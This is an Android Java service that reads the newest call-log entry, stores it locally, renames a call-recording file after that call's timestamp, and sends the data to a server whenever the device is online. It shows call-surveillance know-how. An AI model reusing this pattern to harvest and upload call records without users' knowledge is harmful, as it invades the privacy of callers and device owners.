package com.enuke.smartapp.call.service;

import java.io.File;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.blinkawards.utility.Utility;
import com.enuke.smartapp.call.CallLogBean;
import com.enuke.smartapp.call.CallLogProvider;

public class CallLogSendDataService extends IntentService {

	final private Context mContext = CallLogSendDataService.this;

	private String m_phone;
	private String m_type;
	private String m_phonetype;
	private String m_duration;
	private String m_date;

	public CallLogSendDataService() {
		super("ReadSmsService");
		
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		getLastLogDetails();
		
		

	}

	private void getLastLogDetails() {

		new Thread(new Runnable() {
			private String type;
			
			@Override
			public void run() {
				try {
					Thread.sleep(5000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			
				String[] strFields = { android.provider.CallLog.Calls.NUMBER,
						android.provider.CallLog.Calls.TYPE,
						android.provider.CallLog.Calls.CACHED_NAME,
						android.provider.CallLog.Calls.CACHED_NUMBER_TYPE,
						android.provider.CallLog.Calls.DATE,
						android.provider.CallLog.Calls.DURATION

				};
				String strOrder = android.provider.CallLog.Calls.DATE + " DESC";

				Cursor  mCallCursor = mContext.getContentResolver().query(
						android.provider.CallLog.Calls.CONTENT_URI, strFields,
						null, null, strOrder);
				// get start of cursor
				if (mCallCursor.moveToFirst()) {

					// loop through cursor
					do {
						type= null;
					
						if (mCallCursor.getString(1).equalsIgnoreCase("1")) {
							type = "1";
						} else if (mCallCursor.getString(1).equalsIgnoreCase(
								"2")) {
							type = "2";
						} else if (mCallCursor.getString(1).equalsIgnoreCase(
								"3")) {
							type = "0";
						}
					

				
						 //insert the data in database
						m_phone=mCallCursor.getString(0);
						m_type=type;
						m_phonetype=mCallCursor.getString(3);
						m_duration=Utility.getDurationString(mCallCursor.getString(5));
						m_date=mCallCursor.getString(4);
						
						CallLogProvider.insertReferences(mContext, new CallLogBean(m_phone,m_type, m_phonetype,m_duration,m_date, "NO"));
							
							
							renameRecordedCall(mCallCursor.getString(4));
						 //end
						break;
					} while (mCallCursor.moveToNext());

				}
				if (Utility.isInternetConnected(mContext)) {
					Looper.prepare();
					new Handler().post(new Runnable() {
						
						@Override
						public void run() {
							
							Utility.sendDataToServer(mContext);
						
							
						}
					});
					Looper.loop();
				} else {
					// save the data to local
					//saveCallLogDataLocall(mLastCallData);
					//saveRecordedCall();
				}
			}
			
			/**
			 * This function is used to rename the recorded file  in millisecond format.
			 */
			private void renameRecordedCall(String mFName) {
				try {
					String fileName[] = Utility.getDataDir(mContext).list();
					String mFileName = null;
					for (int i = 0; i < fileName.length; i++) {

						if (fileName[i].startsWith("CallRecord")) {
							////System.out.println("file name is:" + fileName[i]);
							mFileName = fileName[i];
							break;
						}
					}
					File from = new File(Utility.getDataDir(mContext),
							mFileName);

					File to = new File(Utility.getDataDir(mContext), mFName);
					Log.e("TAG", "file name when renaming = "+mFName);
					from.renameTo(to);
				} catch (Exception e) {
					////System.out.println("Eorr in file :" + e);
				}

			}

		}).start();
     }

}
